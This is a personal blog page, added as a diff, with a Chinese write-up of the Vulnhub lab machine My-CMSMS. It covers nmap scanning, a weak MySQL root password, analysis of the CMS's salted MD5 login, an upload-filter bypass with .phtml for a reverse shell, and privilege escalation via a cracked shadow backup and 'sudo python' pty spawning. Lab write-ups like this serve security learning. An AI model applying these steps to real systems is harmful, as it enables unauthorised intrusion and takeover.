@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>Vulnhub靶机1-My-cmsms | he11的农场</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
+<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.主机发现：
+arp-scan  -l
+
+nmap -sn 192.168.223.0/24
+
+靶机：
+
+2.端口扫描：
+nmap -p- -sV -A 192.168.223.132
+PORT      STATE SERVICE VE..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://dydydy123.github.io">
+        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
+        <h1 class="site-title">he11的农场</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      ganma~~~~~~~~~~
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">Vulnhub靶机1-My-cmsms</h2>
+            <div class="post-date">2022-11-23</div>
+            
+            <div class="post-content" v-pre>
+              <p>1.主机发现：<br>
+arp-scan  -l<br>
+<img src="https://dydydy123.github.io/post-images/1669200849782.png" alt="" loading="lazy"></p>
+<p>nmap -sn 192.168.223.0/24<br>
+<img src="https://dydydy123.github.io/post-images/1669200928716.png" alt="" loading="lazy"><br>
+靶机：<br>
+<img src="https://dydydy123.github.io/post-images/1669201014850.png" alt="" loading="lazy"></p>
+<p>2.端口扫描：<br>
+nmap -p- -sV -A 192.168.223.132</p>
+<pre><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
+|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
+|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
+80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
+|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Home - My CMS
+3306/tcp  open  mysql   MySQL 8.0.19
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.19
+|   Thread ID: 41
+|   Capabilities flags: 65535
+|   Some Capabilities: InteractiveClient, IgnoreSigpipes, LongColumnFlag, SupportsTransactions, IgnoreSpaceBeforeParenthesis, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, Support41Auth, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolNew, SupportsLoadDataLocal, FoundRows, SwitchToSSLAfterHandshake, Speaks41ProtocolOld, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: &amp;u\x7F%oTjhs\x10Kn.\x027dTH\\x1D
+|_  Auth Plugin Name: mysql_native_password
+| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate
+| Not valid before: 2020-03-25T09:30:14
+|_Not valid after:  2030-03-23T09:30:14
+|_ssl-date: TLS randomness does not represent time
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message&quot;
+|_    HY000
+</code></pre>
+<p>发现开了80端口到网站扫下目录<br>
+3.目录扫描：<br>
+python3 dirsearch/dirsearch.py -u http://192.168.223.132 -e *<br>
+nikto  -host  http://192.168.223.132<br>
+<img src="https://dydydy123.github.io/post-images/1669290004439.png" alt="" loading="lazy"><br>
+存在网站后台登录界面和phpwyadmin登录界面尝试弱口令均未成功。</p>
+<p>4.远程连接3306<br>
+mysql  -h  192.168.223.132  -u root   -p<br>
+尝试弱口令root，成功进入mysql<br>
+查看cms_users，尝试更改网站管理员密码（初步判断是md5加密的）</p>
+<pre><code>update  cms_users  set password='新密码'； 
+</code></pre>
+<p>尝试登录，失败，可能原因是加盐的md5</p>
+<p>5.源码分析：<br>
+源码下载地址</p>
+<pre><code>http://dev.cmsmadesimple.org/project/code/6
+</code></pre>
+<p>进入admin目录下的login.php<br>
+<img src="https://dydydy123.github.io/post-images/1669291225969.png" alt="" loading="lazy"><br>
+看见注释load user by name与登录有关，如果user不为空则登录成功，跟进LoadUserByUsername（）方法。</p>
+<pre><code>if ($password != '') {
+			$where[] = 'password = ?';
+			$params[] = md5(get_site_preference('sitemask','').$password);
+		}
+</code></pre>
+<p>如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">则</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">入</mi><mi>i</mi><mi>f</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">看</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">此</mi><mi mathvariant="normal">处</mi><mi mathvariant="normal">在</mi></mrow><annotation encoding="application/x-tex">password不为空则进入if，可以看到此处在</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">入</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">看</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">在</span></span></span></span>password前加了东西再进行MD5，猜测</p>
+<p>6.文件上传反弹shell:<br>
+.php被过滤，尝试绕过。<br>
+<img src="https://dydydy123.github.io/post-images/1669271010368.png" alt="" loading="lazy"><br>
+最终使用.phtml上传文件。</p>
+<p>7.权限提升：<br>
+查看当前权限：whoami<br>
+1：查看 <code> /home</code>  目录中也那些用户有自己的目录。<br>
+ls -la /home</p>
+<p>进入用户目录<br>
+cd /home/armour<br>
+ls -la<br>
+<img src="https://dydydy123.github.io/post-images/1669271472825.png" alt="" loading="lazy"></p>
+<p>可以看到  <code>binary.sh</code>  任意用户可读可执行（以root身份执行），要是能修改便可以root权限调起bioss，但此处不可修改。该文件内容也无可用之处。</p>
+<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1669271953369.png" alt="" loading="lazy"></figure>
+<p>2.尝试SUID提权。</p>
+<pre><code>find  / -perm  -u=s -type  f  2&gt;/dev/null
+</code></pre>
+<p>发现无明显利用点</p>
+<p>2.定时任务</p>
+<pre><code>cat /etc/crontab
+</code></pre>
+<p>3.john破解shadow文件<br>
+进入  /var  发现  /backups  备份目录，进入发现shadow备份文件。使用john尝试破解。<br>
+<img src="https://dydydy123.github.io/post-images/1669293607311.png" alt="" loading="lazy"><br>
+<img src="https://dydydy123.github.io/post-images/1669293617070.png" alt="" loading="lazy"><br>
+root用户密码Password<br>
+<img src="https://dydydy123.github.io/post-images/1669293750034.png" alt="" loading="lazy"></p>
+<p>4.sudo  python提权<br>
+进入  /var/www/html/admin  发现.htpasswd文件进行解码获得某用户密码，登录然后<br>
+sudo -l  查看可sudo执行的命令<br>
+<img src="https://dydydy123.github.io/post-images/1669294183574.png" alt="" loading="lazy"><br>
+发现在不输入root密码的情况下可执行python<br>
+<img src="https://dydydy123.github.io/post-images/1669294401850.png" alt="" loading="lazy"><br>
+然后使用<br>
+sudo python -c  'import pty;pty.spawn(&quot;/bin/bash&quot;)'  命令提权。<br>
+<img src="https://dydydy123.github.io/post-images/1669294407993.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+
+  </body>
+</html>
